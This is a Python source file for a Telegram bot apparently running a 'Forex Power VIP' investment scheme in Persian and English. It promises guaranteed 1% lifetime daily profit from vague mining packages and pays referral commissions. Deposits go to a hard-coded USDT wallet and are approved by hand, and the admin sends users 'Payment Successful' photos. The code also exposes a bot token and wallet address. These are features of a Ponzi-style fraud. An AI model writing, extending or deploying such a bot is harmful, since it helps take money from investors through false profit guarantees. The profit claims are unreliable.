mport telebot
from telebot import types
import json
import os
import time
import threading
from datetime import datetime

# ==========================================
# CONFIGURATION
# ==========================================
TOKEN = "8751264368:AAEbpB4CP49P4gs3BV4i8YVt3NU7000mjV0"
ADMIN_ID = 1927800325
CHANNEL = "@FOREX_POWER_VIP"
CHANNEL2 = "@FOREX_POWER_TRADER"
BOT_USERNAME = "forex_power_bot"
USDT_ADDRESS = "TYqWp8rbjs8GJ6JcRnHknnQyo8thnmQvjp"

REFERRAL_COMMISSION_PERCENT = 0.06
MIN_WITHDRAW = 15

# لینک وب‌اپ خود را اینجا بگذارید
WEB_APP_URL = "https://shiny-lebkuchen-4b27ff.netlify.app/" 

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
DATA_FILE = "data.json"

# ==========================================
# LANGUAGE & TEXTS (LUXURY UPDATED)
# ==========================================
LANGS = {
    'fa': {
        'start': """<b>🚀 خوش آمدید به فارکس پاور VIP

💎 پلتفرم سرمایه‌گذاری لوکس
📈 سود 1% روزانه و دائمی

برای ورود به پنل دکمه زیر را بزنید:</b>""",
        'acc_info': """
<b>👤 کارت اطلاعات حساب کاربری
━━━━━━━━━━━━━━━</b>

<b>👤 نام:</b> {first_name}
<b>💰 موجودی سود:</b> <code>{profit}$</code>
<b>🔒 سرمایه گذاری شده:</b> <code>{invested}$</code>
<b>📦 پکیج فعال:</b> {package}
<b>📈 سود روزانه:</b> <code>{daily}$</code>

<b>━━━━━━━━━━━━━━━
🔗 لینک دعوت:
https://t.me/{bot_username}?start={uid}</b>""",
        'msg_about': """<b>ℹ️ درباره فارکس پاور (Forex Power)</b>

🌐 <b>Forex Power Bot</b> یک پلتفرم پیشرو در زمینه سرمایه‌گذاری هوشمند و ترید اتوماتیک در بازارهای جهانی است.

💎 <b>چرا ما؟</b>
✅ <b>سود تضمینی:</b> دریافت 1% سود روزانه به صورت مادام‌العمر.
✅ <b>امنیت لوکس:</b> سیستم امنیت چندلایه برای حفظ سرمایه شما.
✅ <b>پشتیبانی VIP:</b> تیم پشتیبانی 24 ساعته در خدمت شماست.
✅ <b>سیستم زیرمجموعه:</b> کسب درآمد غیرفعال از طریق دعوت دوستان (6% کمیسیون).

🤖 <b>نحوه کار:</b>
با خرید پکیج‌های ماینینگ اختصاصی ما، شبکه هوشمند ما 24 ساعته برای شما کار می‌کند و سود روزانه را مستقیماً به کیف پول شما واریز می‌کند.

⚠️ <b>ساعت کاری سیستم:</b>
پرداخت‌ها و پشتیبانی از ساعت 6 صبح تا 6 عصر به وقت افغانستان/سرور فعال می‌باشد.

📜 <b>حقوق کپی‌رایت 2024 © Forex Power Team</b>""",
        
        'menu_back': '🔙 بازگشت به منو',
        'wd_sent': '✅ درخواست برداشت شما ثبت شد و در صف بررسی قرار گرفت.',
        'support_send': '📩 لطفا پیام خود را برای پشتیبانی بنویسید:',
        'wd_addr': '📍 لطفا آدرس ولت (USDT) یا آیدی باینس (Binance ID) خود را ارسال کنید:',
        'wd_phone': '📱 لطفا شماره موبایل خود را برای واریز موبایل مانی وارد کنید:',
        'wd_amount': '💰 لطفا مبلغ برداشت را به دلار وارد کنید (حداقل 15 دلار):',
        'wd_err_min': '❌ حداقل مبلغ برداشت 15 دلار است.',
        'wd_err_balance': '❌ موجودی سود شما کافی نیست.',
        'inv_select': '✅ پکیج انتخاب شد. لطفا اسکرین‌شات واریز را ارسال کنید.',
        'wd_receipt_request': '📸 درخواست تایید شد. لطفا <b>عکس رسید پرداخت</b> را ارسال کنید تا برای کاربر فرستاده شود.',
    },
    'en': {
        'start': """<b>🚀 Welcome to Forex Power VIP

💎 Luxury Investment Platform
📈 1% Daily Profit - Lifetime

Tap the button below to enter the panel:</b>""",
        'acc_info': """
<b>👤 ACCOUNT STATEMENT
━━━━━━━━━━━━━━━</b>

<b>👤 Name:</b> {first_name}
<b>💰 Profit Balance:</b> <code>{profit}$</code>
<b>🔒 Total Invested:</b> <code>{invested}$</code>
<b>📦 Active Plan:</b> {package}
<b>📈 Daily Profit:</b> <code>{daily}$</code>

<b>━━━━━━━━━━━━━━━
🔗 Ref Link:
https://t.me/{bot_username}?start={uid}</b>""",
        'msg_about': """<b>ℹ️ About Forex Power</b>

🌐 <b>Forex Power Bot</b> is a leading platform for smart investment and automated trading in global markets.

💎 <b>Why Us?</b>
✅ <b>Guaranteed Profit:</b> Earn 1% daily profit for a lifetime.
✅ <b>Luxury Security:</b> Multi-layer security to protect your assets.
✅ <b>VIP Support:</b> 24/7 support team at your service.
✅ <b>Referral System:</b> Earn passive income by inviting friends (6% commission).

🤖 <b>How It Works:</b>
By purchasing our exclusive mining packages, our intelligent network works 24/7 for you, crediting daily profits directly to your wallet.

⚠️ <b>Working Hours:</b>
Payments and support are active from 6 AM to 6 PM Server Time.

📜 <b>Copyright 2024 © Forex Power Team</b>""",
        
        'menu_back': '🔙 Back to Menu',
        'wd_sent': '✅ Withdrawal request submitted and is under review.',
        'support_send': '📩 Please write your support message:',
        'wd_addr': '📍 Please send your Wallet Address (USDT) or Binance ID:',
        'wd_phone': '📱 Please enter your Mobile Number for Mobile Money transfer:',
        'wd_amount': '💰 Please enter withdrawal amount in USD (Min 15$):',
        'wd_err_min': '❌ Minimum withdrawal is 15$.',
        'wd_err_balance': '❌ Insufficient profit balance.',
        'inv_select': '✅ Package selected. Please send payment screenshot.',
        'wd_receipt_request': '📸 Request Approved. Please send the <b>payment receipt photo</b> now to forward to the user.',
    }
}

def get_text(user, key, **kwargs):
    lang = user.get('lang', 'fa')
    text = LANGS[lang].get(key, key)
    try:
        return text.format(**kwargs)
    except:
        return text

# ==========================================
# PACKAGES
# ==========================================
PACKAGES = {
    50: ("VIP 1", 0.50, "10 GH/S"),
    100: ("VIP 2", 1.00, "20 GH/S"),
    150: ("VIP 3", 1.50, "30 GH/S"),
    200: ("VIP 4", 2.00, "40 GH/S"),
    300: ("VIP 5", 3.00, "60 GH/S"),
    500: ("VIP 6", 5.00, "100 GH/S"),
    800: ("VIP 7", 8.00, "160 GH/S"),
    1000: ("VIP 8", 10.00, "200 GH/S"),
    1500: ("VIP 9", 15.00, "300 GH/S"),
    2000: ("VIP 10", 20.00, "400 GH/S")
}

# ==========================================
# DATA SYSTEM
# ==========================================
def load():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, "w") as f:
            json.dump({}, f)
    try:
        with open(DATA_FILE) as f:
            data = json.load(f)
    except:
        data = {}
    
    for uid in data:
        if uid == "_SETTINGS": continue
        u = data[uid]
        u.setdefault("balance", 0)
        u.setdefault("invested", 0)
        u.setdefault("profit", 0)
        u.setdefault("referral", 0)
        u.setdefault("daily_profit", 0)
        u.setdefault("package", "NONE")
        u.setdefault("last_profit", time.time())
        u.setdefault("step", None)
        u.setdefault("temp", 0)
        u.setdefault("wd_type", "")
        u.setdefault("wd_addr", "") 
        u.setdefault("wd_phone", "") 
        u.setdefault("ref_by", None)
        u.setdefault("first_name", "User")
        u.setdefault("username", "")
        u.setdefault("invest_time", 0)
        u.setdefault("lang", "fa")
    return data

def save(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def check_join(user_id):
    try:
        return (bot.get_chat_member(CHANNEL, user_id).status in ["member", "administrator", "creator"] and 
                bot.get_chat_member(CHANNEL2, user_id).status in ["member", "administrator", "creator"])
    except: return False

def main_menu(user):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(types.KeyboardButton("🚀 Open VIP Menu", web_app=types.WebAppInfo(url=WEB_APP_URL)))
    
    # Show Admin Buttons in Chat if user is Admin
    if str(user.get('id')) == str(ADMIN_ID):
        kb.row("📊 Admin Stats", "👥 Users List")
        kb.row("📢 Broadcast", "💱 Set Rate")
        
    return kb

def back_menu(user):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(get_text(user, 'menu_back'))
    return kb

def auto_profit(user):
    if user.get("invest_time", 0) > 0:
        now = time.time()
        last = user.get("last_profit", user["invest_time"])
        days_passed = int((now - last) / 86400)
        if days_passed >= 1:
            user["profit"] += (user.get("daily_profit", 0) * days_passed)
            user["last_profit"] = now

# ==========================================
# HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def start(m):
    users = load()
    uid = str(m.from_user.id)
    
    if uid not in users:
        users[uid] = {
            "balance": 0, "invested": 0, "profit": 0, "referral": 0, # FIXED: comma changed to colon
            "daily_profit": 0, "package": "NONE", "last_profit": time.time(),
            "step": None, "temp": 0, "wd_type": "", "wd_addr": "", "wd_phone": "",
            "ref_by": None, "first_name": m.from_user.first_name,
            "username": m.from_user.username if m.from_user.username else "NoUser",
            "invest_time": 0, "lang": "fa"
        }
        args = m.text.split()
        if len(args) > 1 and args[1] in users:
            users[uid]["ref_by"] = args[1]
            users[args[1]]["referral"] += 1
            try: bot.send_message(args[1], f"🎉 New Referral: {users[uid]['first_name']}")
            except: pass

    if not check_join(m.from_user.id):
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Join Channel 1", url=f"https://t.me/{CHANNEL.replace('@','')}"))
        kb.add(types.InlineKeyboardButton("Join Channel 2", url=f"https://t.me/{CHANNEL2.replace('@','')}"))
        kb.add(types.InlineKeyboardButton("✅ Check", callback_data="check"))
        bot.send_message(m.chat.id, "Please join channels first:", reply_markup=kb)
        return

    auto_profit(users[uid])
    save(users)
    
    # Send start message (Clean, no extra admin text)
    bot.send_message(m.chat.id, get_text(users[uid], 'start'), reply_markup=main_menu(users[uid]))

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app(message):
    users = load()
    uid = str(message.from_user.id)
    if uid not in users: return
    
    user = users[uid]
    try:
        data = json.loads(message.web_app_data.data)
        action = data.get('action')

        if action == 'buy_package':
            amount = int(data.get('amount'))
            if amount in PACKAGES:
                user["temp"] = amount
                user["step"] = "photo"
                save(users)
                level, daily, _ = PACKAGES[amount]
                msg = f"""<b>📦 Plan: {level}
💰 Amount: ${amount}
📈 Daily Profit: ${daily} (1%)
⏳ Lifetime Earnings

💳 Wallet: <code>{USDT_ADDRESS}</code>

📤 Send screenshot to proceed.</b>"""
                bot.send_message(message.chat.id, msg, reply_markup=back_menu(user))

        elif action == 'withdraw_usdt':
            user["wd_type"] = "USDT TRC20"
            user["step"] = "wd_address"
            save(users)
            bot.send_message(message.chat.id, get_text(user, 'wd_addr'), reply_markup=back_menu(user))
        
        elif action == 'withdraw_binance':
            user["wd_type"] = "Binance ID"
            user["step"] = "wd_address"
            save(users)
            bot.send_message(message.chat.id, get_text(user, 'wd_addr'), reply_markup=back_menu(user))
        
        elif action == 'withdraw_mobile':
            user["wd_type"] = "Mobile Money"
            user["step"] = "wd_phone"
            save(users)
            bot.send_message(message.chat.id, get_text(user, 'wd_phone'), reply_markup=back_menu(user))

        elif action == 'account':
            # Luxury HTML Account View
            bot.send_message(message.chat.id, 
                get_text(user, 'acc_info', 
                    first_name=user['first_name'],
                    profit=round(user['profit'], 2),
                    invested=user['invested'],
                    package=user['package'],
                    daily=user['daily_profit'],
                    bot_username=BOT_USERNAME,
                    uid=uid), 
                reply_markup=main_menu(user))

        elif action == 'referral':
            bot.send_message(message.chat.id, 
                f"""<b>👥 REFERRAL SYSTEM
━━━━━━━━━━━━━━━
💎 Commission: 6%
👥 Total Referred: {user['referral']}

🔗 Your Link:
https://t.me/{BOT_USERNAME}?start={uid}</b>""", reply_markup=main_menu(user))
        
        elif action == 'support':
            user["step"] = "support"
            save(users)
            bot.send_message(message.chat.id, get_text(user, 'support_send'), reply_markup=back_menu(user))
        
        elif action == 'about':
            # Luxury About View
            bot.send_message(message.chat.id, get_text(user, 'msg_about'), reply_markup=main_menu(user))

        elif action == 'admin_panel' and int(uid) == ADMIN_ID:
             bot.send_message(message.chat.id, "Admin Panel Accessed", reply_markup=main_menu(user))

    except Exception as e:
        print(e)

@bot.message_handler(content_types=['text', 'photo'])
def handle_general(m):
    users = load()
    uid = str(m.from_user.id)
    if uid not in users: return
    user = users[uid]
    text = m.text or ""

    # --- PHOTO HANDLER (ADMIN SENDING RECEIPT) ---
    if user.get("step", "").startswith("wd_photo_"):
        if m.photo:
            target_uid = user["step"].split("_")[2]
            file_id = m.photo[-1].file_id
            
            # Send photo to user
            caption = f"<b>✅ Payment Successful\n\nMethod: {users[target_uid]['wd_type']}\nAmount: ${users[target_uid]['temp']}</b>"
            bot.send_photo(target_uid, file_id, caption=caption)
            
            # Notify Admin
            bot.send_message(ADMIN_ID, "✅ Receipt sent to user.")
            
            user["step"] = None
            save(users)
        else:
            bot.send_message(ADMIN_ID, "❌ Please send a photo.")
        return

    # --- INVESTMENT PHOTO STEP ---
    if user["step"] == "photo" and m.photo:
        file_id = m.photo[-1].file_id
        amt = user['temp']
        pkg = PACKAGES.get(amt, ("?",0,""))
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"ok_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"no_{uid}"))
        bot.send_photo(ADMIN_ID, file_id, caption=f"<b>New Investment: {user['first_name']}\nPlan: {pkg[0]}\n${amt}</b>", reply_markup=kb)
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, get_text(user, 'inv_select'), reply_markup=main_menu(user))
        return

    # --- WITHDRAWAL STEPS ---
    if user["step"] == "wd_address":
        user["wd_addr"] = text
        user["step"] = "wd_amount"
        save(users)
        bot.send_message(m.chat.id, get_text(user, 'wd_amount'), reply_markup=back_menu(user))
        return
        
    if user["step"] == "wd_phone":
        user["wd_phone"] = text
        user["step"] = "wd_amount"
        save(users)
        bot.send_message(m.chat.id, get_text(user, 'wd_amount'), reply_markup=back_menu(user))
        return
        
    if user["step"] == "wd_amount":
        try:
            amt = float(text)
            if amt < MIN_WITHDRAW: 
                bot.send_message(m.chat.id, get_text(user, 'wd_err_min')); return
            if amt > user["profit"]: 
                bot.send_message(m.chat.id, get_text(user, 'wd_err_balance')); return
            
            user["temp"] = amt
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"wd_ok_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"wd_no_{uid}"))
            
            # Shows Address/ID in Admin Message
            detail_info = user['wd_addr'] if user['wd_addr'] else user['wd_phone']
            admin_msg = f"""<b>📤 NEW WITHDRAWAL REQUEST
━━━━━━━━━━━━━━━
👤 User: {user['first_name']} ({uid})
💰 Amount: ${amt}
🏦 Method: {user['wd_type']}
📍 Detail: <code>{detail_info}</code></b>"""
            
            bot.send_message(ADMIN_ID, admin_msg, reply_markup=kb)
            user["step"] = None; save(users)
            bot.send_message(m.chat.id, get_text(user, 'wd_sent'), reply_markup=main_menu(user))
        except: pass
        return

    # --- SUPPORT STEP ---
    if user["step"] == "support":
        bot.send_message(ADMIN_ID, f"📞 <b>Support Msg</b>\nFrom: {user['first_name']}\n\n{text}")
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, "✅ Message sent to support.", reply_markup=main_menu(user))
        return

    # --- ADMIN CHAT COMMANDS ---
    if int(uid) == ADMIN_ID:
        if text == "📊 Admin Stats":
            bot.send_message(m.chat.id, f"<b>Total Users: {len(users)-1}</b>", reply_markup=main_menu(user))
        elif text == "💱 Set Rate":
            user["step"] = "set_rate"
            save(users)
            bot.send_message(m.chat.id, "Enter new rate:", reply_markup=back_menu(user))
        elif user.get("step") == "set_rate":
            try:
                # In a real app, save this to settings
                bot.send_message(m.chat.id, "✅ Rate updated (Simulated).", reply_markup=main_menu(user))
                user["step"] = None
                save(users)
            except: pass
        elif text == "📢 Broadcast":
            user["step"] = "broadcast"
            save(users)
            bot.send_message(m.chat.id, "Enter text to broadcast:", reply_markup=back_menu(user))
        elif user.get("step") == "broadcast":
            c = 0
            for u in users:
                if u != "_SETTINGS":
                    try: bot.send_message(u, text); c+=1
                    except: pass
            bot.send_message(m.chat.id, f"Sent to {c} users.", reply_markup=main_menu(user))
            user["step"] = None

@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    users = load()
    uid = str(c.from_user.id)
    
    if c.data == "check":
        if check_join(c.from_user.id):
            bot.send_message(c.message.chat.id, "✅ Verified!", reply_markup=main_menu(users[uid]))
        else: bot.answer_callback_query(c.id, "Join first")

    elif c.data.startswith("ok_"):
        target = c.data.split("_")[1]
        u = users[target]
        amt = u['temp']
        pkg = PACKAGES.get(amt)
        if pkg:
            rid = u.get('ref_by')
            if rid and rid in users:
                users[rid]['profit'] += (amt * REFERRAL_COMMISSION_PERCENT)
            
            if u["package"] == "NONE":
                u["package"] = pkg[0]; u["invested"] = amt; u["daily_profit"] = pkg[1]; u["invest_time"] = time.time()
            else:
                u["invested"] += amt; u["daily_profit"] += pkg[1]
            
            u["last_profit"] = time.time()
            save(users)
            bot.send_message(target, f"<b>✅ Investment Approved!\nPlan: {pkg[0]}\nAmt: ${amt}\nDaily: ${pkg[1]}</b>")
            try: bot.edit_message_text("✅ Approved", c.message.chat.id, c.message.message_id)
            except: pass

    elif c.data.startswith("no_"):
        bot.send_message(c.data.split("_")[1], "❌ Investment Rejected")
        try: bot.edit_message_text("❌ Rejected", c.message.chat.id, c.message.message_id)
        except: pass

    elif c.data.startswith("wd_ok_"):
        target = c.data.split("_")[2]
        u = users[target]
        
        # Deduct Profit
        u['profit'] -= u['temp']
        save(users)
        
        # Notify User that request is approved (waiting for receipt)
        bot.send_message(target, f"✅ <b>Withdrawal Request Approved!</b>\n\nAmount: ${u['temp']}\nMethod: {u['wd_type']}\n\nPayment receipt will be sent shortly.")
        
        # Set Admin Step to ask for Photo
        users[str(ADMIN_ID)]['step'] = f"wd_photo_{target}"
        save(users)
        
        # Ask Admin for Photo
        bot.send_message(ADMIN_ID, get_text(users[ADMIN_ID], 'wd_receipt_request'), reply_markup=back_menu(users[ADMIN_ID]))
        
        try: bot.edit_message_text("✅ Approved. Waiting for Receipt...", c.message.chat.id, c.message.message_id)
        except: pass
    
    elif c.data.startswith("wd_no_"):
        bot.send_message(c.data.split("_")[2], "❌ Withdrawal Rejected")
        try: bot.edit_message_text("❌ Rejected", c.message.chat.id, c.message.message_id)
        except: pass

print("🚀 Bot Running...")
bot.infinity_polling()
